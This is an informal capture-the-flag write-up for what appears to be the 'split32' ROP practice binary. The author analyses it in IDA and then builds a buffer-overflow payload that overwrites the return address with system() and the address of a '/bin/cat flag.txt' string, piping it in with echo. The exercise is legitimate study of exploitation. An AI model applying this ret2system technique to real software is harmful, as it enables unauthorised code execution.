here go again!

that ctf dont have the main code too,then we go to analizyng with ida!


When analize,we saw a call to _read(no buff),call system and a useful string (/bin/cat catflag.txt)!

then we have to find all adress,but how this function is in the program,we doesnt have to find LibC adress >.<!!!!

buf + system + ret + string = flag captured!

buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab"
system = \xe0\x83\x04\x08
ret = AAAA
string = \x30\xa0\x04\x08

echo -e "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xe0\x83\x04\x08AAAA\x30\xa0\x04\x08" | ./split32 

FLAG CAPTURED!
